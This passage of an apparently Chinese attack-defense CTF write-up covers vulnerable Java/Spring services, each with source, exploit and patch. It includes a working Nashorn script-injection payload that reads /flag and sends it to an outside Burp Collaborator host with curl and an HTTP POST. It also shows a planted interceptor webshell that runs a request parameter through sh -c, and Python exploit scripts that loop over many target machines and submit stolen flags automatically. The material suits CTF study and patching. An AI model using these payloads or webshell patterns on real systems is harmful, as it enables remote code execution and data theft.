class="number">22</span>calc</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå°è¯•å¤–å¸¦,ç”¨javaè‡ªæœ‰åº“è¯»æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsurl</span> <span class="operator">=</span> <span class="string">&quot;nashorn:mozilla_compat.js\&quot;); &quot;</span> +</span><br><span class="line"><span class="string">&quot;importPackage(java.lang); &quot;</span> +</span><br><span class="line"><span class="string">&quot;var x = Runtime.getRuntime(); &quot;</span> +</span><br><span class="line"><span class="string">&quot;importPackage(java.io.FileReader); &quot;</span> +</span><br><span class="line"><span class="string">&quot;importPackage(java.io.BufferedReader); &quot;</span> +</span><br><span class="line"><span class="string">&quot;var file = new java.io.File(&#x27;/flag&#x27;);&quot;</span> + <span class="comment">// åˆ©ç”¨java.io.File(&#x27;/flag&#x27;)è¯»å–æ–‡ä»¶</span></span><br><span class="line"><span class="string">&quot;var fileReader = new java.io.FileReader(file);&quot;</span> +</span><br><span class="line"><span class="string">&quot;var bufferedReader = new java.io.BufferedReader(fileReader);&quot;</span> +</span><br><span class="line"><span class="string">&quot;var flag = bufferedReader.readLine();&quot;</span> +</span><br><span class="line"><span class="string">&quot;var cmd = \&quot;curl -X GET http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/?\&quot;;&quot;</span> +</span><br><span class="line"><span class="string">&quot;x.exec(cmd%2Bflag);&quot;</span> +</span><br><span class="line"><span class="string">&quot;(\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><p>åªèƒ½åšåˆ°å‘½ä»¤æ‰§è¡Œï¼Œæ— æ³•æ‰§è¡Œå®Œæ•´çš„curlæäº¤åˆ°apiæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/ -H &#x27;Authorization: xxx&#x27; -d &#x27;&#123;\&quot;flag\&quot;: \&quot;1111\&quot;&#125;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨jdkè‡ªå¸¦çš„åº“å®ç°postè¯·æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsurl</span> <span class="operator">=</span> <span class="string">&quot;nashorn:mozilla_compat.js\&quot;); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.lang); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;var x = Runtime.getRuntime(); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.io.FileReader); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.io.BufferedReader); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;var file = new java.io.File(&#x27;/flag&#x27;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var fileReader = new java.io.FileReader(file);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var bufferedReader = new java.io.BufferedReader(fileReader);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var flag = bufferedReader.readLine();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;importPackage(java.net); &quot;</span> +</span><br><span class="line">               <span class="string">&quot;var url = \&quot;http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/\&quot;;&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var obj = new URL(url);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var con = obj.openConnection();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setRequestMethod(\&quot;POST\&quot;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setRequestProperty(\&quot;Content-Type\&quot;, \&quot;application/json\&quot;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setRequestProperty(\&quot;Authorization\&quot;, \&quot;xxx\&quot;);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var data = \&quot;&#123;\\\&quot;flag\\\&quot;:\\\&quot;\&quot; + flag + \&quot;\\\&quot;&#125;\&quot;;&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.setDoOutput(true);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;var wr = new java.io.DataOutputStream(con.getOutputStream());&quot;</span> +</span><br><span class="line">               <span class="string">&quot;wr.writeBytes(data);&quot;</span> +</span><br><span class="line">               <span class="string">&quot;wr.flush();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;wr.close();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;con.getResponseCode();&quot;</span> +</span><br><span class="line">               <span class="string">&quot;(\&quot;&quot;</span>;</span><br><span class="line">       System.out.println(jsurl);</span><br><span class="line">       <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">       <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span>engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">       <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">       System.out.println(engine.eval(cmd, bindings));</span><br></pre></td></tr></table></figure><p>è¯·æ±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/jsEngine?jsurl=nashorn:mozilla_compat.js%<span class="number">22</span>);%<span class="number">20</span>importPackage(java.lang);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>x%<span class="number">20</span>=%<span class="number">20</span>Runtime.<span class="title function_ invoke__">getRuntime</span>();%<span class="number">20</span>importPackage(java.io.FileReader);%<span class="number">20</span>importPackage(java.io.BufferedReader);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>file%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>java.io.<span class="title function_ invoke__">File</span>(%<span class="number">27</span>/flag%<span class="number">27</span>);<span class="keyword">var</span>%<span class="number">20</span>fileReader%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>java.io.<span class="title function_ invoke__">FileReader</span>(file);<span class="keyword">var</span>%<span class="number">20</span>bufferedReader%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">new</span>%<span class="number">20</span>java.io.<span class="title function_ invoke__">BufferedReader</span>(fileReader);<span class="keyword">var</span>%<span class="number">20</span>flag%<span class="number">20</span>=%<span class="number">20</span>bufferedReader.<span class="title function_ invoke__">readLine</span>();<span class="title function_ invoke__">importPackage</span>(java.net);%<span class="number">20</span><span class="keyword">var</span>%<span class="number">20</span>url%<span class="number">20</span>=%<span class="number">20</span>%<span class="number">22</span>http:<span class="comment">//bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/%22;var%20obj%20=%20new%20URL(url);var%20con%20=%20obj.openConnection();con.setRequestMethod(%22POST%22);con.setRequestProperty(%22Content-Type%22,%20%22application/json%22);con.setRequestProperty(%22Authorization%22,%20%22xxx%22);con.setDoOutput(true);var%20wr%20=%20new%20java.io.DataOutputStream(con.getOutputStream());wr.writeBytes(%22%7B%27flag%27:%20%27%22%20%2B%20flag%20%2B%20%22%27%7D%22);wr.flush();wr.close();con.getResponseCode();(%22</span></span><br></pre></td></tr></table></figure><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&#x27;/util/jsEngine?jsurl=nashorn:mozilla_compat.js%22);%20importPackage(java.lang);%20var%20x%20=%20Runtime.getRuntime();%20importPackage(java.io.FileReader);%20importPackage(java.io.BufferedReader);%20var%20file%20=%20new%20java.io.File(%27/flag%27);var%20fileReader%20=%20new%20java.io.FileReader(file);var%20bufferedReader%20=%20new%20java.io.BufferedReader(fileReader);var%20flag%20=%20bufferedReader.readLine();importPackage(java.net);%20var%20url%20=%20%22http://bxcl2ozhapx8lllzmp142n6ljcp2dr.burpcollaborator.net/%22;var%20obj%20=%20new%20URL(url);var%20con%20=%20obj.openConnection();con.setRequestMethod(%22POST%22);con.setRequestProperty(%22Content-Type%22,%20%22application/json%22);con.setRequestProperty(%22Authorization%22,%20%22xxx%22);con.setDoOutput(true);var%20wr%20=%20new%20java.io.DataOutputStream(con.getOutputStream());wr.writeBytes(%22%7B%27flag%27:%20%27%22%20%2B%20flag%20%2B%20%22%27%7D%22);wr.flush();wr.close();con.getResponseCode();(%22&#x27;</span></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&#x27;http://127.0.0.1:10180/&#x27;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">        <span class="comment"># print(f&quot;==========ç¬¬&#123;count&#125;è½®æäº¤=========&quot;)</span></span><br><span class="line">        <span class="comment"># count = 10180</span></span><br><span class="line">        <span class="comment"># for i in range(1, 81):</span></span><br><span class="line">            <span class="comment"># url ä¸ºé¶æœºip</span></span><br><span class="line">            <span class="comment"># uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">            <span class="comment"># print(f&quot;==========ç¬¬&#123;i&#125;å·é¶æœº===========&quot;)</span></span><br><span class="line">            <span class="comment"># get_flag1(uri)</span></span><br><span class="line">            <span class="comment"># count += 100</span></span><br><span class="line">        <span class="comment"># time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-4"><a href="#patch-4" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/jsEngine&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> Map <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Map</span> <span class="variable">jsStatus</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">jsStatus.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;jsEngine is ready&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> jsStatus;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><h3 id="æºç -5"><a href="#æºç -5" class="headerlink" title="æºç "></a>æºç </h3><p>&#x2F;init æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InitController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/init&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">escape</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object i : adaptedInterceptors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i.getClass().getName().contains(<span class="string">&quot;EscapeUtil&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        adaptedInterceptors.add(<span class="keyword">new</span> <span class="title class_">Exit</span>.EscapeUtil());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;util&#x2F;EscapeUtil</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EscapeUtil</span>  <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;nbl&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;nbl&quot;</span>);</span><br><span class="line">               Process process;</span><br><span class="line">               process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line"></span><br><span class="line">               <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">               <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">               String line;</span><br><span class="line">               <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                   stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               response.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">               response.getOutputStream().flush();</span><br><span class="line">               response.getOutputStream().close();</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨-5"><a href="#æ¼æ´åˆ©ç”¨-5" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—®&#x2F;initååŠ è½½æ‹¦æˆªå™¨å®ä¾‹åŒ–EscapeUtilè®¿é—®ä»»æ„æ¥å£æäº¤nblå‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http request</span><br><span class="line">GET /init/</span><br><span class="line">GET /init?nbl=cat%<span class="number">20</span>/flag</span><br><span class="line">GET /util/image?nbl=cat%<span class="number">20</span>/flag</span><br><span class="line">GET /util/json?nbl=cat%<span class="number">20</span>/flag</span><br><span class="line">GET /util/apiTest?nbl=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">count1 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url,</span><br><span class="line">                        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxxx&quot;</span>&#125;,</span><br><span class="line">                        proxies=proxies,</span><br><span class="line">                        data=json.dumps(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">global</span> count1</span><br><span class="line">        count1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag1</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url1 = url + <span class="string">&#x27;init/&#x27;</span></span><br><span class="line">        url2 = url + <span class="string">&#x27;init/?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        url3 = url + <span class="string">&#x27;util/image?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        url4 = url + <span class="string">&#x27;util/json?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        url5 = url + <span class="string">&#x27;util/apiTest?nbl=cat%20/flag&#x27;</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response1 = requests.get(url=url1, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        response1 = requests.get(url=url1, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        response2 = requests.get(url=url2, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response2.text)</span><br><span class="line">        submit_flag(response2.text)</span><br><span class="line">        response3 = requests.get(url=url3, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response3.text)</span><br><span class="line">        submit_flag(response3.text)</span><br><span class="line">        response4 = requests.get(url=url4, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response4.text)</span><br><span class="line">        submit_flag(response4.text)</span><br><span class="line">        response5 = requests.get(url=url5, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response5.text)</span><br><span class="line">        submit_flag(response5.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag1(<span class="string">&quot;http://127.0.0.1:10180/&quot;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment">#     print(f&quot;==========ç¬¬&#123;count&#125;è½®æäº¤=========&quot;)</span></span><br><span class="line">    <span class="comment">#     count = 10180</span></span><br><span class="line">    <span class="comment">#     # count = 14680</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#     for i in range(1, 59):</span></span><br><span class="line">    <span class="comment">#         # url ä¸ºé¶æœºip</span></span><br><span class="line">    <span class="comment">#         uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">    <span class="comment">#         print(f&quot;==========ç¬¬&#123;i&#125;å·é¶æœº===========&quot;)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         count += 100</span></span><br><span class="line">    <span class="comment">#     print(&quot;[+]Get flag count &#123;&#125;&quot;.format(count1))</span></span><br><span class="line">    <span class="comment">#     count1 = 0</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-5"><a href="#patch-5" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EscapeUtil</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="title function_">EscapeUtil</span><span class="params">()</span> &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;nbl&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;nbl&quot;</span>);</span><br><span class="line">               response.getOutputStream().write(<span class="string">&quot;dont&quot;</span>.getBytes());</span><br><span class="line">               response.getOutputStream().flush();</span><br><span class="line">               response.getOutputStream().close();</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="æºç -6"><a href="#æºç -6" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/database/connect&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">mysql</span><span class="params">(<span class="meta">@RequestParam</span> String ip, <span class="meta">@RequestParam</span> String port, <span class="meta">@RequestParam</span> String database, <span class="meta">@RequestParam</span> String username, <span class="meta">@RequestParam</span> String password)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> 